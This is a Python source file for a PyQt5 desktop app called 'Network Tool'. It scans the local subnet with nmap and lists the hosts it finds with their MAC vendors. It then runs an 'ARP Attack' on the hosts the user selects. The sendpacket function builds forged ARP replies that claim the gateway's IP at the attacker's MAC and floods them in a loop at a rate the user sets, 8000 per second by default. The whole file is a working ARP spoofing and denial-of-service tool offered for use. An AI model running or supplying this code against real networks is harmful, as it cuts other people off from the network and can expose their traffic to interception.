import sys
import requests
import threading
from PyQt5.QtWidgets import (
    QApplication,
    QWidget,
    QPushButton,
    QLabel,
    QVBoxLayout,
    QListWidget,
    QLineEdit,
    QMessageBox,
    QListWidgetItem,
    QAbstractItemView,
    QProgressDialog,
    QDesktopWidget,
    QHBoxLayout,
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
import nmap
import netifaces
import socket
from scapy.all import Ether, ARP, srp, sendp


class NetworkScanner(QThread):
    update_status = pyqtSignal(str)
    finished_scanning = pyqtSignal(list)
    error_occurred = pyqtSignal(str)

    def run(self):
        try:
            self.update_status.emit("Scanning Network...")
            hosts = onlineIp()
            self.finished_scanning.emit(hosts)
        except Exception as e:
            self.error_occurred.emit(f"Failed to scan network: {str(e)}")


class NetworkToolGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.attack_threads = []
        self.stop_attack_event = threading.Event()

    def initUI(self):
        self.setWindowTitle("Network Tool")

        layout = QVBoxLayout()

        self.scan_button = QPushButton("Scan Network", self)
        self.scan_button.clicked.connect(self.scan_network)

        self.ip_list = QListWidget(self)
        self.ip_list.setSelectionMode(QAbstractItemView.ExtendedSelection)
        self.ip_list.itemSelectionChanged.connect(self.update_target_indices)

        self.label_indices = QLabel("Target indices:", self)
        self.input_indices = QLineEdit(self)
        self.input_indices.textChanged.connect(self.update_selection_from_indices)

        self.label_packets = QLabel("Packets per second:", self)
        self.input_packets = QLineEdit(self)
        self.input_packets.setText("8000")
        self.input_packets.textChanged.connect(self.check_packets_input)

        self.attack_button = QPushButton("Start ARP Attack", self)
        self.attack_button.setEnabled(False)
        self.attack_button.clicked.connect(self.start_arp_attack)

        layout.addWidget(self.scan_button)
        layout.addWidget(self.ip_list)

        indices_layout = QHBoxLayout()
        indices_layout.addWidget(self.label_indices)
        indices_layout.addWidget(self.input_indices)
        layout.addLayout(indices_layout)

        layout.addWidget(self.label_packets)
        layout.addWidget(self.input_packets)
        layout.addWidget(self.attack_button)

        self.setLayout(layout)

        # Adjust the initial window size
        self.resize(400, 300)

    def check_packets_input(self):
        """Enable attack button only if valid input is provided."""
        text = self.input_packets.text()
        self.attack_button.setEnabled(text.isdigit() and int(text) > 0)

    def scan_network(self):
        self.scanning_dialog = QProgressDialog(self)
        self.scanning_dialog.setWindowTitle("Processing")
        self.scanning_dialog.setLabelText("Scanning Network...")
        self.scanning_dialog.setCancelButtonText("Cancel")
        self.scanning_dialog.setRange(0, 0)
        self.scanning_dialog.setWindowModality(Qt.ApplicationModal)
        self.scanning_dialog.setMinimumWidth(300)

        self.user_canceled = False
        self.scanning_dialog.canceled.connect(self.cancel_scan)
        self.scanning_dialog.show()

        # Start the network scanning in a separate thread
        self.network_scanner = NetworkScanner()
        self.network_scanner.update_status.connect(self.scanning_dialog.setLabelText)
        self.network_scanner.finished_scanning.connect(self.on_scan_complete)
        self.network_scanner.error_occurred.connect(self.on_scan_error)
        self.network_scanner.start()

    def cancel_scan(self):
        if self.network_scanner.isRunning():
            self.network_scanner.terminate()
            self.user_canceled = True
            QMessageBox.warning(self, "Operation Cancelled", "Operation was cancelled by the user.")
        self.scanning_dialog.close()

    def on_scan_complete(self, hosts):
        if not self.user_canceled:
            self.scanning_dialog.close()
            self.ip_list.clear()
            if hosts:
                for i, (ip, mac) in enumerate(hosts):
                    item_text = f"[{i}] {ip}\t{mac}"
                    item = QListWidgetItem(item_text)
                    self.ip_list.addItem(item)
                self.adjust_window_size()
            else:
                QMessageBox.information(self, "No Devices Found", "No devices were found on the network.")

    def on_scan_error(self, message):
        self.scanning_dialog.close()
        QMessageBox.critical(self, "Error", message)

    def update_target_indices(self):
        """Update the target indices input field based on selected list items."""
        selected_indices = sorted(
            int(item.text().split(']')[0][1:]) for item in self.ip_list.selectedItems()
        )
        self.input_indices.blockSignals(True)  # Prevent recursion
        self.input_indices.setText(' '.join(map(str, selected_indices)))
        self.input_indices.blockSignals(False)

    def update_selection_from_indices(self):
        """Update the list selection based on the target indices input field."""
        try:
            indices = sorted(int(i) for i in self.input_indices.text().split() if i.isdigit())
            self.ip_list.blockSignals(True)  # Prevent recursion
            self.ip_list.clearSelection()
            for index in indices:
                if 0 <= index < self.ip_list.count():
                    self.ip_list.item(index).setSelected(True)
            self.ip_list.blockSignals(False)
        except ValueError:
            pass  # Ignore invalid input

    def start_arp_attack(self):
        selected_items = self.ip_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Targets Selected", "Please select at least one target to attack.")
            return

        packets_per_sec = int(self.input_packets.text())

        # Ensure we are using a fresh scan list
        hosts = onlineIp()
        selected_targets = []
        for item in selected_items:
            try:
                index = int(item.text().split(']')[0][1:])
                ip, mac = hosts[index]
                selected_targets.append((ip, mac.split(" ")[0]))
            except IndexError:
                QMessageBox.warning(self, "Error", "Selected index out of range.")

        my_ip, my_mac = getMyIp_Mac()
        gateway_ip, _ = getGateWayIp_Mac()

        # Use a dialog to indicate the attack is ongoing
        self.attack_dialog = QProgressDialog(self)
        self.attack_dialog.setWindowTitle("ARP Attack Running")
        self.attack_dialog.setLabelText("Sending ARP packets...")
        self.attack_dialog.setCancelButtonText("Stop Attack")
        self.attack_dialog.setRange(0, 0)
        self.attack_dialog.setWindowModality(Qt.ApplicationModal)
        self.attack_dialog.setMinimumWidth(300)

        self.attack_dialog.canceled.connect(self.cancel_attack)
        self.attack_dialog.show()

        # Reset stop event and start the attack in separate threads
        self.stop_attack_event.clear()
        self.attack_threads = [
            threading.Thread(target=self.run_attack, args=(my_mac, gateway_ip, target, packets_per_sec))
            for target in selected_targets
        ]

        for thread in self.attack_threads:
            thread.start()

    def run_attack(self, my_mac, gateway_ip, target, pkt_per_sec):
        try:
            target_ip, target_mac = target
            sendpacket(my_mac, gateway_ip, target_ip, target_mac, pkt_per_sec, self.stop_attack_event)
        except Exception as e:
            self.on_attack_error(str(e))

    def cancel_attack(self):
        self.stop_attack_event.set()  # Signal all threads to stop
        for thread in self.attack_threads:
            if thread.is_alive():
                thread.join()  # Wait for thread to stop
        self.attack_dialog.close()

    def closeEvent(self, event):
        """Ensure all threads are terminated when the window is closed."""
        self.cancel_attack()
        event.accept()

    def adjust_window_size(self):
        # Get screen size
        screen = QDesktopWidget().screenGeometry()
        screen_width = screen.width()
        screen_height = screen.height()

        # Calculate the maximum width required by the list items, if there are items
        if self.ip_list.count() > 0:
            # Calculate the width of each list item, including the sequence numbers
            max_width = max(self.fontMetrics().horizontalAdvance(item.text()) for item in self.ip_list.findItems('*', Qt.MatchWildcard))
            max_height = self.ip_list.sizeHintForRow(0) * (self.ip_list.count() + 1)

            # Include the width of the scrollbar and the sequence numbers
            scrollbar_width = self.style().pixelMetric(QApplication.style().PM_ScrollBarExtent)
            padding = 30  # Increased padding

            # Calculate the new size of the window based on the maximum width and height of the list items
            new_width = min(max_width + scrollbar_width + padding, screen_width)
            new_height = min(max(self.height(), max_height + 60), screen_height)

            self.resize(new_width, new_height)


def scanNetwork(network, gateway_ip):
    returnlist = []
    nm = nmap.PortScanner()
    a = nm.scan(hosts=network, arguments="-T4 -n -Pn")

    for k, v in a["scan"].items():
        if v["status"]["state"] == 'up' and v['addresses']['ipv4'] != gateway_ip:
            try:
                mac_address = v['addresses']['mac']
                manufacturer = get_manufacturer(mac_address)
                returnlist.append([v['addresses']['ipv4'], f"{mac_address} ({manufacturer})"])
            except:
                pass

    return returnlist


def get_manufacturer(mac_address):
    mac_address = mac_address.replace(":", "").replace("-", "").upper()
    url = f"https://api.macvendors.com/{mac_address}"

    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown"
    except requests.RequestException:
        return "Unknown"


def sendpacket(my_mac, gateway_ip, target_ip, target_mac, count, stop_event):
    ether = Ether()
    ether.src = my_mac
    ether.dst = target_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac
    arp.pdst = target_ip
    arp.hwdst = target_mac
    arp.op = 2

    packet = ether / arp
    while not stop_event.is_set():  # Check the event to see if we should stop
        sendp(packet, count=count, inter=1.0/count, verbose=False)

def getMyIp_Mac():
    myhostname = socket.gethostname()
    myip = socket.gethostbyname(myhostname)
    return myip, getHostMac(myip)


def getGateWayIp_Mac():
    gateIp = netifaces.gateways()['default'][netifaces.AF_INET][0]
    getGateMac = getHostMac(gateIp)
    return gateIp, getGateMac


def getHostMac(host):
    try:
        query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=host)
        ans, _ = srp(query, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except:
        return False


def onlineIp():
    gateway_ip, _ = getGateWayIp_Mac()
    networks = gateway_ip[:-1] + '1/24'
    hostlist = scanNetwork(network=networks, gateway_ip=gateway_ip)
    return hostlist


def arpAttack(my_mac, gateway_ip, targets, pkt_per_sec):
    stop_event = threading.Event()
    threads = []
    # 为每个目标创建一个发送包的线程
    for target_ip, target_mac in targets:
        # 基于期望的速率和目标数量计算要发送的包数
        t = threading.Thread(target=sendpacket, args=(my_mac, gateway_ip, target_ip, target_mac, pkt_per_sec, stop_event))
        t.start()
        threads.append(t)
    # 等待所有线程完成
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = NetworkToolGUI()
    window.show()
    sys.exit(app.exec_())
